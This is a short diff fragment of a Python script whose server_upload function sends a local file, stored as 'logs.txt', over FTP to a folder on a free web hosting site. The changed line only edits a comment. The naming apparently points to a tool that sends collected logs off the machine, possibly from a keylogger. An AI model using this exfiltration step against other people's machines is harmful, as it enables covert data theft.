@@ -36,7 +36,7 @@ def server_upload(): #now here you need a free web hosting site. i preferred to 
     
     session.cwd('url/subfolder') #what folder you want the data to be stored on in the web hosting site.
     
-    file = open('new.txt','rb') #open the file and also read binary numbers. i just wrote that rb in case someone wants to communicate in binary.
+    file = open('new.txt','rb') #open the file and also read binary numbers.
     
     session.storbinary('STOR logs.txt', file) #sending our file over ftp.
     
